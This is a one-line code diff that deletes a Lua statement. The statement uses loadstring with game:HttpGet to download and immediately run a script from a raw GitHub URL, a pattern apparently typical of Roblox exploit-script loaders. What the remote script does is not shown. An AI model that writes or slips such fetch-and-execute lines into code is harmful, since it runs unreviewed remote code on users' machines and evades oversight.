@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/memeboiyoot/Random-stuff/main/chainsaw')))()
